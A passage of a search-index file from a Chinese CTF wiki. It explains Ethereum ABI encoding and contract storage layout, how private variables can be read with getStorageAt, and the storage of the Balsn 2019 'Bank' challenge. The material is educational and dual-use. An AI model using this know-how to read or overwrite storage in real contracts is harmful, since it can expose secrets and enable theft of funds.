encoding of 3 10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"] 11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\" 12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\" 13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\" 14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\" g \u6307\u5411\u5b57\u7b26\u4e32\u6570\u7ec4\u7684\u5f00\u59cb\uff0c\u6240\u4ee5 g=0x20*10=140 \u6240\u4ee5\u603b\u7684 selector + encoding \u5982\u4e0b\u6240\u793a 0xcc80bc65 // function selector 0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1,2],[3]] 1 - 0x0000000000000000000000000000000000000000000000000000000000000140 // offset of [\"one\",\"two\",\"three\"] 2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1,2],[3]] 3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1,2] 4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3] 5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1,2] 6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 1 7 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 2 8 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3] 9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3 10- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [\"one\",\"two\",\"three\"] 11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for \"one\" 12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for \"two\" 13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for \"three\" 14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"one\" 15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of \"one\" 16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for \"two\" 17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of \"two\" 18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for \"three\" 19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of \"three\"","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/selector-encoding/#_5","text":"","title":"\u4f8b\u9898"},{"location":"blockchain/ethereum/selector-encoding/#balsn-2020","text":"\u9898\u76ee\u540d\u79f0 Election Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"balsn 2020"},{"location":"blockchain/ethereum/storage/","text":"Ethereum Storage \u00b6 \u63d2\u69fd \u00b6 \u4ee5\u592a\u574a\u6570\u636e\u5b58\u50a8\u4f1a\u4e3a\u5408\u7ea6\u7684\u6bcf\u9879\u6570\u636e\u6307\u5b9a\u4e00\u4e2a\u53ef\u8ba1\u7b97\u7684\u5b58\u50a8\u4f4d\u7f6e\uff0c\u5b58\u653e\u5728\u4e00\u4e2a\u5bb9\u91cf\u4e3a 2^256 \u7684\u8d85\u7ea7\u6570\u7ec4\u4e2d\uff0c\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u63d2\u69fd\uff0c\u5176\u521d\u59cb\u503c\u4e3a 0\u3002\u867d\u7136\u6570\u7ec4\u5bb9\u91cf\u7684\u4e0a\u9650\u5f88\u9ad8\uff0c\u4f46\u5b9e\u9645\u4e0a\u5b58\u50a8\u662f\u7a00\u758f\u7684\uff0c\u53ea\u6709\u975e\u96f6(\u7a7a\u503c)\u6570\u636e\u624d\u4f1a\u88ab\u771f\u6b63\u5199\u5165\u5b58\u50a8\u3002 # \u63d2\u69fd\u5f0f\u6570\u7ec4\u5b58\u50a8 ---------------------------------- | 0 | # slot 0 ---------------------------------- | 1 | # slot 1 ---------------------------------- | 2 | # slot 2 ---------------------------------- | ... | # ... ---------------------------------- | ... | # \u6bcf\u4e2a\u63d2\u69fd 32 \u5b57\u8282 ---------------------------------- | ... | # ... ---------------------------------- | 2^256-1 | # slot 2^256-1 ---------------------------------- \u5f53\u6570\u636e\u957f\u5ea6\u662f\u5df2\u77e5\u65f6\uff0c\u5176\u5177\u4f53\u7684\u5b58\u50a8\u4f4d\u7f6e\u5c06\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a\uff0c\u800c\u5bf9\u4e8e\u957f\u5ea6\u4e0d\u786e\u5b9a\u7684\u7c7b\u578b\uff08\u5982\u52a8\u6001\u6570\u7ec4\u3001\u6620\u5c04\uff09\uff0c\u5219\u4f1a\u6309\u4e00\u5b9a\u89c4\u5219\u8ba1\u7b97\u5b58\u50a8\u4f4d\u7f6e\u3002\u4ee5\u4e0b\u662f\u5bf9\u4e0d\u540c\u7c7b\u578b\u53d8\u91cf\u7684\u50a8\u5b58\u6a21\u578b\u7684\u5177\u4f53\u5206\u6790\u3002 \u503c\u7c7b\u578b \u00b6 \u9664\u6620\u5c04\u548c\u52a8\u6001\u6570\u7ec4\u4e4b\u5916\u7684\u6240\u6709\u7c7b\u578b\uff0c\u5176\u6570\u636e\u957f\u5ea6\u90fd\u662f\u5df2\u77e5\u7684\uff0c\u5982\u5b9a\u957f\u6574\u578b( int / uint /...), \u5730\u5740( address ), \u5b9a\u957f\u6d6e\u70b9\u578b( fixed / ufixed /...), \u5b9a\u957f\u5b57\u8282\u6570\u7ec4( bytes1 - bytes32 )\uff0c\u7f16\u8bd1\u65f6\u5c06\u4e25\u683c\u6839\u636e\u5b57\u6bb5\u6392\u5e8f\u987a\u5e8f\uff0c\u4ece\u4f4d\u7f6e 0 \u5f00\u59cb\u8fde\u7eed\u653e\u7f6e\u5728\u5b58\u50a8\u4e2d\u3002\u5982\u679c\u53ef\u80fd\u7684\u8bdd\uff0c\u5927\u5c0f\u5c11\u4e8e 32 \u5b57\u8282\u7684\u591a\u4e2a\u53d8\u91cf\u4f1a\u88ab\u6253\u5305\u5230\u4e00\u4e2a\u63d2\u69fd\u4e2d\uff0c\u800c\u5f53\u67d0\u9879\u6570\u636e\u8d85\u8fc7 32 \u5b57\u8282\uff0c\u5219\u9700\u8981\u5360\u7528\u591a\u4e2a\u8fde\u7eed\u63d2\u69fd\uff08 data.length / 32 \uff09\u3002\u89c4\u5219\u5982\u4e0b\uff1a \u5b58\u50a8\u63d2\u69fd\u7684\u7b2c\u4e00\u9879\u4f1a\u4ee5\u4f4e\u4f4d\u5bf9\u9f50\uff08\u5373\u53f3\u5bf9\u9f50\uff09\u7684\u65b9\u5f0f\u50a8\u5b58\u3002 \u57fa\u672c\u7c7b\u578b\u4ec5\u4f7f\u7528\u5b58\u50a8\u5b83\u4eec\u6240\u9700\u7684\u5b57\u8282\u3002 \u5982\u679c\u5b58\u50a8\u63d2\u69fd\u4e2d\u7684\u5269\u4f59\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u50a8\u5b58\u4e00\u4e2a\u57fa\u672c\u7c7b\u578b\uff0c\u90a3\u4e48\u5b83\u4f1a\u88ab\u79fb\u5165\u4e0b\u4e00\u4e2a\u5b58\u50a8\u63d2\u69fd\u3002 \u7ed3\u6784\u548c\u6570\u7ec4\u6570\u636e\u603b\u662f\u4f1a\u5360\u7528\u4e00\u6574\u4e2a\u65b0\u63d2\u69fd\uff08\u4f46\u7ed3\u6784\u6216\u6570\u7ec4\u4e2d\u7684\u5404\u9879\uff0c\u90fd\u4f1a\u4ee5\u8fd9\u4e9b\u89c4\u5219\u8fdb\u884c\u6253\u5305\uff09\u3002 \u5982\u4ee5\u4e0b\u5408\u7ea6\uff1a pragma solidity ^ 0.4.0 ; contract C { address a ; // 0 uint8 b ; // 0 uint256 c ; // 1 bytes24 d ; // 2 } \u5176\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a ----------------------------------------------------- | unused (11) | b (1) | a (20) | <- slot 0 ----------------------------------------------------- | c (32) | <- slot 1 ----------------------------------------------------- | unused (8) | d (24) | <- slot 2 ----------------------------------------------------- \u6620\u5c04 \u00b6 \u5bf9\u4e8e\u5f62\u5982 mapping(address => uint) a; \u7684\u6620\u5c04\u7c7b\u578b\u53d8\u91cf\uff0c\u5c31\u65e0\u6cd5\u7b80\u5355\u4eff\u7167\u503c\u7c7b\u578b\u6309\u987a\u5e8f\u50a8\u5b58\u4e86\u3002\u5bf9\u4e8e\u6620\u5c04\uff0c\u5176\u4f1a\u6839\u636e\u4e0a\u8282\u63d0\u5230\u7684\u89c4\u5219\u5360\u636e\u4f4d\u7f6e p \u5904\u7684\u4e00\u4e2a\u63d2\u69fd\uff0c\u4f46\u8be5\u63d2\u69fd\u4e0d\u4f1a\u88ab\u771f\u6b63\u4f7f\u7528\u3002\u6620\u5c04\u4e2d\u7684\u952e k \u6240\u5bf9\u5e94\u7684\u503c\u4f1a\u4f4d\u4e8e keccak256(k . p) \uff0c \u5176\u4e2d . \u662f\u8fde\u63a5\u7b26\u3002\u5982\u679c\u8be5\u503c\u540c\u65f6\u662f\u4e00\u4e2a\u975e\u57fa\u672c\u7c7b\u578b\uff0c\u5219\u5c06 keccak256(k . p) \u4f5c\u4e3a\u504f\u79fb\u91cf\u6765\u627e\u5230\u5177\u4f53\u7684\u4f4d\u7f6e\u3002 \u5982\u4ee5\u4e0b\u5408\u7ea6\uff1a pragma solidity ^ 0.4.0 ; contract C { mapping ( address => uint ) a ; // 0 uint256 b ; // 1 } \u5176\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a ----------------------------------------------------- | reserved (a) | <- slot 0 ----------------------------------------------------- | b (32) | <- slot 1 ----------------------------------------------------- | ... | ...... ----------------------------------------------------- | a[addr] (32) | <- slot `keccak256(addr . 0)` ----------------------------------------------------- | ... | ...... ----------------------------------------------------- \u52a8\u6001\u6570\u7ec4 \u00b6 \u5bf9\u4e8e\u5f62\u5982 uint[] b; \u7684\u52a8\u6001\u6570\u7ec4\uff0c\u5176\u540c\u6837\u4f1a\u5360\u7528\u5bf9\u5e94\u4f4d\u7f6e p \u5904\u7684\u63d2\u69fd\uff0c\u7528\u4ee5\u50a8\u5b58\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u800c\u6570\u7ec4\u771f\u6b63\u7684\u8d77\u59cb\u70b9\u4f1a\u4f4d\u4e8e keccak256(p) \u5904\uff08\u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u5728\u8fd9\u91cc\u662f\u4e00\u4e2a\u4f8b\u5916\uff0c\u89c1\u4e0b\u6587\uff09\u3002 \u5982\u4ee5\u4e0b\u5408\u7ea6\uff1a pragma solidity ^ 0.4.0 ; contract C { uint256 a ; // 0 uint [] b ; // 1 uint256 c ; // 2 } \u5176\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a ----------------------------------------------------- | a (32) | <- slot 0 ----------------------------------------------------- | b.length (32) | <- slot 1 ----------------------------------------------------- | c (32) | <- slot 2 ----------------------------------------------------- | ... | ...... ----------------------------------------------------- | b[0] (32) | <- slot `keccak256(1)` ----------------------------------------------------- | b[1] (32) | <- slot `keccak256(1) + 1` ----------------------------------------------------- | ... | ...... ----------------------------------------------------- \u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32 \u00b6 \u5982\u679c bytes \u548c string \u7684\u6570\u636e\u5f88\u77ed\uff0c\u90a3\u4e48\u5b83\u4eec\u7684\u957f\u5ea6\u4e5f\u4f1a\u548c\u6570\u636e\u4e00\u8d77\u5b58\u50a8\u5230\u540c\u4e00\u4e2a\u63d2\u69fd\u3002\u5177\u4f53\u5730\u8bf4\uff1a\u5982\u679c\u6570\u636e\u957f\u5ea6\u5c0f\u4e8e\u7b49\u4e8e 31 \u5b57\u8282\uff0c \u5219\u5b83\u5b58\u50a8\u5728\u9ad8\u4f4d\u5b57\u8282\uff08\u5de6\u5bf9\u9f50\uff09\uff0c\u6700\u4f4e\u4f4d\u5b57\u8282\u5b58\u50a8 length * 2 \u3002\u5982\u679c\u6570\u636e\u957f\u5ea6\u8d85\u51fa 31 \u5b57\u8282\uff0c\u5219\u5728\u4e3b\u63d2\u69fd\u5b58\u50a8 length * 2 + 1 \uff0c \u6570\u636e\u7167\u5e38\u5b58\u50a8\u5728 keccak256(slot) \u4e2d\u3002 \u53ef\u89c1\u6027 \u00b6 \u7531\u4e8e\u4ee5\u592a\u574a\u4e0a\u7684\u6240\u6709\u4fe1\u606f\u90fd\u662f\u516c\u5f00\u7684\uff0c\u6240\u4ee5\u5373\u4f7f\u4e00\u4e2a\u53d8\u91cf\u88ab\u58f0\u660e\u4e3a private \uff0c\u6211\u4eec\u4ecd\u80fd\u8bfb\u5230\u53d8\u91cf\u7684\u5177\u4f53\u503c\u3002 \u5229\u7528 web3 \u63d0\u4f9b\u7684 web3.eth.getStorageAt() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u8bfb\u53d6\u4e00\u4e2a\u4ee5\u592a\u574a\u5730\u5740\u4e0a\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b58\u50a8\u5185\u5bb9\u3002\u6240\u4ee5\u53ea\u8981\u8ba1\u7b97\u51fa\u4e86\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u63d2\u69fd\u4f4d\u7f6e\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528\u8be5\u51fd\u6570\u6765\u83b7\u5f97\u8be5\u53d8\u91cf\u7684\u5177\u4f53\u503c\u3002 \u8c03\u7528\uff1a // web3.eth.getStorageAt(address, position [, defaultBlock] [, callback]) web3 . eth . getStorageAt ( \"0x407d73d8a49eeb85d32cf465507dd71d507100c1\" , 0 ) . then ( console . log ); > \"0x033456732123ffff2342342dd12342434324234234fd234fd23fd4f23d4234\" \u53c2\u6570\uff1a address \uff1aString - \u8981\u8bfb\u53d6\u7684\u5730\u5740 position \uff1aNumber - \u5b58\u50a8\u4e2d\u7684\u7d22\u5f15\u7f16\u53f7 defaultBlock \uff1aNumber|String - \u53ef\u9009\uff0c\u4f7f\u7528\u8be5\u53c2\u6570\u8986\u76d6 web3.eth.defaultBlock \u5c5e\u6027\u503c callback \uff1aFunction - \u53ef\u9009\u7684\u56de\u8c03\u51fd\u6570, \u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u9519\u8bef\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u7ed3\u679c\u3002 \u4f8b\u5b50 \u00b6 \u4ee5 Balsn CTF 2019 \u7684 Bank \u4e00\u9898\u4e3a\u4f8b\uff0c\u66f4\u4e3a\u5177\u4f53\u8bb2\u89e3\u4ee5\u592a\u574a\u7684\u5b58\u50a8\u5e03\u5c40\u3002\u9898\u76ee\u4e2d\u53d8\u91cf\u548c\u7ed3\u6784\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a contract Bank { address public owner ; uint randomNumber = 0 ; struct SafeBox { bool done ; function ( uint , bytes12 ) internal callback ; bytes12 hash ; uint value ; } SafeBox [] safeboxes ; struct FailedAttempt { uint idx ; uint time ; bytes12 triedPass ; address origin ; } mapping ( address => FailedAttempt []) failedLogs ; } \u5408\u7ea6\u7684\u53d8\u91cf\u6309\u7167\u4ee5\u4e0b\u5e03\u5c40\u5b58\u50a8\u5728\u63d2\u69fd 0 \u5230 3 \u4e0a\uff1a ----------------------------------------------------- | unused ( 12 ) | owner ( 20 ) | <- slot 0 ----------------------------------------------------- | randomNumber ( 32 ) | <- slot 1 ----------------------------------------------------- | safeboxes . length ( 32 ) | <- slot 2 ----------------------------------------------------- | occupied by failedLogs but unused ( 32 ) | <- slot 3 ----------------------------------------------------- \u5bf9\u4e8e\u7ed3\u6784 SafeBox \u548c FailedAttempt \uff0c\u6bcf\u4e2a\u7ed3\u6784\u5360\u636e\u7684\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a # SafeBox ----------------------------------------------------- | unused (11) | hash (12) | callback (8) | done (1) | ----------------------------------------------------- | value (32) | ----------------------------------------------------- # FailedAttempt ----------------------------------------------------- | idx (32) | ----------------------------------------------------- | time (32) | ----------------------------------------------------- | origin (20) | triedPass (12) | ----------------------------------------------------- \u5bf9\u4e8e\u6570\u7ec4 safeboxes \uff0c\u6570\u7ec4\u5185\u5143\u7d20\u7684\u8d77\u59cb\u70b9\u5728 keccak256(2) \u5904\uff0c\u6bcf\u4e2a\u5143\u7d20\u5360\u636e 2 \u4e2a\u63d2\u69fd\uff1b\u800c\u5bf9\u4e8e\u6620\u5c04 failedLogs \uff0c\u9700\u8981\u5148\u901a\u8fc7 keccak256(addr . 3) \u6765\u5f97\u5230\u7279\u5b9a\u5730\u5740 addr \u5bf9\u5e94\u6570\u7ec4\u7684\u4f4d\u7f6e\uff0c\u8be5\u4f4d\u7f6e\u8bb0\u5f55\u7740\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u800c\u6570\u7ec4\u771f\u6b63\u7684\u8d77\u59cb\u70b9\u4f4d\u4e8e keccak256(keccak256(addr . 3)) \u5904\uff0c\u6bcf\u4e2a\u5143\u7d20\u5360\u636e 3 \u4e2a\u63d2\u69fd\u3002 \u53ef\u4ee5\u501f\u52a9\u4ee5\u4e0b\u4ee3\u7801\u65b9\u4fbf\u5730\u8ba1\u7b97\u6570\u7ec4\u548c\u6620\u5c04\u5bf9\u5e94\u5143\u7d20\u7684\u771f\u6b63\u4f4d\u7f6e\uff1a function read_slot ( uint k ) public view returns ( bytes32 res ) { assembly { res : = sload ( k ) } } function cal_addr ( uint k , uint p ) public pure returns ( bytes32 res ) { res = keccak256 ( abi . encodePacked ( k , p )); } function cal_addr ( uint p ) public pure returns ( bytes32 res ) { res = keccak256 ( abi . encodePacked ( p )); } \u9898\u76ee \u00b6 \u4e0e\u4ee5\u592a\u574a\u7684\u5b58\u50a8\u76f8\u5173\u7684\u653b\u51fb\u4e00\u822c\u5206\u4e3a\u4e24\u7c7b\uff1a \u5229\u7528\u4ee5\u592a\u574a\u4e0a\u5b58\u50a8\u672c\u8d28\u4e0a\u90fd\u662f\u516c\u5f00\u7684\u8fd9\u4e00\u7279\u6027\uff0c\u4efb\u610f\u8bfb\u53d6\u58f0\u660e\u4e3a private \u7684\u53d8\u91cf\u3002 \u7ed3\u5408\u4efb\u610f\u5199\u7684\u6f0f\u6d1e\uff0c\u8986\u76d6\u4ee5\u592a\u574a\u4e0a\u7684\u7279\u5b9a\u4f4d\u7f6e\u7684\u5b58\u50a8 XCTF_final 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Happy_DOuble_Eleven Balsn 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Bank \u53c2\u8003 \u00b6 \u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6 OPCODE \u9006\u5411\u4e4b\u7406\u8bba\u57fa\u7840\u7bc7 - \u5168\u5c40\u53d8\u91cf\u7684\u50a8\u5b58\u6a21\u578b Solidity\u4e2d\u6587\u6587\u6863 - \u5b58\u50a8\u4e2d\u7684\u72b6\u6001\u53d8\u91cf\u50a8\u5b58\u7ed3\u6784 web3.js - Ethereum JavaScript API Balsn CTF 2019 - Bank","title":"Ethereum Storage"},{"location":"blockchain/ethereum/storage/#ethereum-storage","text":"","title":"Ethereum Storage"},{"location":"blockchain/ethereum/storage/#_1","text":"\u4ee5\u592a\u574a\u6570\u636e\u5b58\u50a8\u4f1a\u4e3a\u5408\u7ea6\u7684\u6bcf\u9879\u6570\u636e\u6307\u5b9a\u4e00\u4e2a\u53ef\u8ba1\u7b97\u7684\u5b58\u50a8\u4f4d\u7f6e\uff0c\u5b58\u653e\u5728\u4e00\u4e2a\u5bb9\u91cf\u4e3a 2^256 \u7684\u8d85\u7ea7\u6570\u7ec4\u4e2d\uff0c\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u63d2\u69fd\uff0c\u5176\u521d\u59cb\u503c\u4e3a 0\u3002\u867d\u7136\u6570\u7ec4\u5bb9\u91cf\u7684\u4e0a\u9650\u5f88\u9ad8\uff0c\u4f46\u5b9e\u9645\u4e0a\u5b58\u50a8\u662f\u7a00\u758f\u7684\uff0c\u53ea\u6709\u975e\u96f6(\u7a7a\u503c)\u6570\u636e\u624d\u4f1a\u88ab\u771f\u6b63\u5199\u5165\u5b58\u50a8\u3002 # \u63d2\u69fd\u5f0f\u6570\u7ec4\u5b58\u50a8 ---------------------------------- | 0 | # slot 0 ---------------------------------- | 1 | # slot 1 ---------------------------------- | 2 | # slot 2 ---------------------------------- | ... | # ... ---------------------------------- | ... | # \u6bcf\u4e2a\u63d2\u69fd 32 \u5b57\u8282 ---------------------------------- | ... | # ... ---------------------------------- | 2^256-1 | # slot 2^256-1 ---------------------------------- \u5f53\u6570\u636e\u957f\u5ea6\u662f\u5df2\u77e5\u65f6\uff0c\u5176\u5177\u4f53\u7684\u5b58\u50a8\u4f4d\u7f6e\u5c06\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a\uff0c\u800c\u5bf9\u4e8e\u957f\u5ea6\u4e0d\u786e\u5b9a\u7684\u7c7b\u578b\uff08\u5982\u52a8\u6001\u6570\u7ec4\u3001\u6620\u5c04\uff09\uff0c\u5219\u4f1a\u6309\u4e00\u5b9a\u89c4\u5219\u8ba1\u7b97\u5b58\u50a8\u4f4d\u7f6e\u3002\u4ee5\u4e0b\u662f\u5bf9\u4e0d\u540c\u7c7b\u578b\u53d8\u91cf\u7684\u50a8\u5b58\u6a21\u578b\u7684\u5177\u4f53\u5206\u6790\u3002","title":"\u63d2\u69fd"},{"location":"blockchain/ethereum/storage/#_2","text":"\u9664\u6620\u5c04\u548c\u52a8\u6001\u6570\u7ec4\u4e4b\u5916\u7684\u6240\u6709\u7c7b\u578b\uff0c\u5176\u6570\u636e\u957f\u5ea6\u90fd\u662f\u5df2\u77e5\u7684\uff0c\u5982\u5b9a\u957f\u6574\u578b( int / uint /...), \u5730\u5740( address ), \u5b9a\u957f\u6d6e\u70b9\u578b( fixed / ufixed /...), \u5b9a\u957f\u5b57\u8282\u6570\u7ec4( bytes1 - bytes32 )\uff0c\u7f16\u8bd1\u65f6\u5c06\u4e25\u683c\u6839\u636e\u5b57\u6bb5\u6392\u5e8f\u987a\u5e8f\uff0c\u4ece\u4f4d\u7f6e 0 \u5f00\u59cb\u8fde\u7eed\u653e\u7f6e\u5728\u5b58\u50a8\u4e2d\u3002\u5982\u679c\u53ef\u80fd\u7684\u8bdd\uff0c\u5927\u5c0f\u5c11\u4e8e 32 \u5b57\u8282\u7684\u591a\u4e2a\u53d8\u91cf\u4f1a\u88ab\u6253\u5305\u5230\u4e00\u4e2a\u63d2\u69fd\u4e2d\uff0c\u800c\u5f53\u67d0\u9879\u6570\u636e\u8d85\u8fc7 32 \u5b57\u8282\uff0c\u5219\u9700\u8981\u5360\u7528\u591a\u4e2a\u8fde\u7eed\u63d2\u69fd\uff08 data.length / 32 \uff09\u3002\u89c4\u5219\u5982\u4e0b\uff1a \u5b58\u50a8\u63d2\u69fd\u7684\u7b2c\u4e00\u9879\u4f1a\u4ee5\u4f4e\u4f4d\u5bf9\u9f50\uff08\u5373\u53f3\u5bf9\u9f50\uff09\u7684\u65b9\u5f0f\u50a8\u5b58\u3002 \u57fa\u672c\u7c7b\u578b\u4ec5\u4f7f\u7528\u5b58\u50a8\u5b83\u4eec\u6240\u9700\u7684\u5b57\u8282\u3002 \u5982\u679c\u5b58\u50a8\u63d2\u69fd\u4e2d\u7684\u5269\u4f59\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u50a8\u5b58\u4e00\u4e2a\u57fa\u672c\u7c7b\u578b\uff0c\u90a3\u4e48\u5b83\u4f1a\u88ab\u79fb\u5165\u4e0b\u4e00\u4e2a\u5b58\u50a8\u63d2\u69fd\u3002 \u7ed3\u6784\u548c\u6570\u7ec4\u6570\u636e\u603b\u662f\u4f1a\u5360\u7528\u4e00\u6574\u4e2a\u65b0\u63d2\u69fd\uff08\u4f46\u7ed3\u6784\u6216\u6570\u7ec4\u4e2d\u7684\u5404\u9879\uff0c\u90fd\u4f1a\u4ee5\u8fd9\u4e9b\u89c4\u5219\u8fdb\u884c\u6253\u5305\uff09\u3002 \u5982\u4ee5\u4e0b\u5408\u7ea6\uff1a pragma solidity ^ 0.4.0 ; contract C { address a ; // 0 uint8 b ; // 0 uint256 c ; // 1 bytes24 d ; // 2 } \u5176\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a ----------------------------------------------------- | unused (11) | b (1) | a (20) | <- slot 0 ----------------------------------------------------- | c (32) | <- slot 1 ----------------------------------------------------- | unused (8) | d (24) | <- slot 2 -----------------------------------------------------","title":"\u503c\u7c7b\u578b"},{"location":"blockchain/ethereum/storage/#_3","text":"\u5bf9\u4e8e\u5f62\u5982 mapping(address => uint) a; \u7684\u6620\u5c04\u7c7b\u578b\u53d8\u91cf\uff0c\u5c31\u65e0\u6cd5\u7b80\u5355\u4eff\u7167\u503c\u7c7b\u578b\u6309\u987a\u5e8f\u50a8\u5b58\u4e86\u3002\u5bf9\u4e8e\u6620\u5c04\uff0c\u5176\u4f1a\u6839\u636e\u4e0a\u8282\u63d0\u5230\u7684\u89c4\u5219\u5360\u636e\u4f4d\u7f6e p \u5904\u7684\u4e00\u4e2a\u63d2\u69fd\uff0c\u4f46\u8be5\u63d2\u69fd\u4e0d\u4f1a\u88ab\u771f\u6b63\u4f7f\u7528\u3002\u6620\u5c04\u4e2d\u7684\u952e k \u6240\u5bf9\u5e94\u7684\u503c\u4f1a\u4f4d\u4e8e keccak256(k . p) \uff0c \u5176\u4e2d . \u662f\u8fde\u63a5\u7b26\u3002\u5982\u679c\u8be5\u503c\u540c\u65f6\u662f\u4e00\u4e2a\u975e\u57fa\u672c\u7c7b\u578b\uff0c\u5219\u5c06 keccak256(k . p) \u4f5c\u4e3a\u504f\u79fb\u91cf\u6765\u627e\u5230\u5177\u4f53\u7684\u4f4d\u7f6e\u3002 \u5982\u4ee5\u4e0b\u5408\u7ea6\uff1a pragma solidity ^ 0.4.0 ; contract C { mapping ( address => uint ) a ; // 0 uint256 b ; // 1 } \u5176\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a ----------------------------------------------------- | reserved (a) | <- slot 0 ----------------------------------------------------- | b (32) | <- slot 1 ----------------------------------------------------- | ... | ...... ----------------------------------------------------- | a[addr] (32) | <- slot `keccak256(addr . 0)` ----------------------------------------------------- | ... | ...... -----------------------------------------------------","title":"\u6620\u5c04"},{"location":"blockchain/ethereum/storage/#_4","text":"\u5bf9\u4e8e\u5f62\u5982 uint[] b; \u7684\u52a8\u6001\u6570\u7ec4\uff0c\u5176\u540c\u6837\u4f1a\u5360\u7528\u5bf9\u5e94\u4f4d\u7f6e p \u5904\u7684\u63d2\u69fd\uff0c\u7528\u4ee5\u50a8\u5b58\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u800c\u6570\u7ec4\u771f\u6b63\u7684\u8d77\u59cb\u70b9\u4f1a\u4f4d\u4e8e keccak256(p) \u5904\uff08\u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u5728\u8fd9\u91cc\u662f\u4e00\u4e2a\u4f8b\u5916\uff0c\u89c1\u4e0b\u6587\uff09\u3002 \u5982\u4ee5\u4e0b\u5408\u7ea6\uff1a pragma solidity ^ 0.4.0 ; contract C { uint256 a ; // 0 uint [] b ; // 1 uint256 c ; // 2 } \u5176\u5b58\u50a8\u5e03\u5c40\u5982\u4e0b\uff1a ----------------------------------------------------- | a (32) | <- slot 0 ----------------------------------------------------- | b.length (32) | <- slot 1 ----------------------------------------------------- | c (32) | <- slot 2 ----------------------------------------------------- | ... | ...... ----------------------------------------------------- | b[0] (32) | <- slot `keccak256(1)` ----------------------------------------------------- | b[1] (32) | <- slot `keccak256(1) + 1` ----------------------------------------------------- | ... | ...... -----------------------------------------------------","title":"\u52a8\u6001\u6570\u7ec4"},{"location":"blockchain/ethereum/storage/#_5","text":"\u5982\u679c bytes \u548c string \u7684\u6570\u636e\u5f88\u77ed\uff0c\u90a3\u4e48\u5b83\u4eec\u7684\u957f\u5ea6\u4e5f\u4f1a\u548c\u6570\u636e\u4e00\u8d77\u5b58\u50a8\u5230\u540c\u4e00\u4e2a\u63d2\u69fd\u3002\u5177\u4f53\u5730\u8bf4\uff1a\u5982\u679c\u6570\u636e\u957f\u5ea6\u5c0f\u4e8e\u7b49\u4e8e 31 \u5b57\u8282\uff0c \u5219\u5b83\u5b58\u50a8\u5728\u9ad8\u4f4d\u5b57\u8282\uff08\u5de6\u5bf9\u9f50\uff09\uff0c\u6700\u4f4e\u4f4d\u5b57\u8282\u5b58\u50a8 length * 2 \u3002\u5982\u679c\u6570\u636e\u957f\u5ea6\u8d85\u51fa 31 \u5b57\u8282\uff0c\u5219\u5728\u4e3b\u63d2\u69fd\u5b58\u50a8 length * 2 + 1 \uff0c \u6570\u636e\u7167\u5e38\u5b58\u50a8\u5728 keccak256(slot) 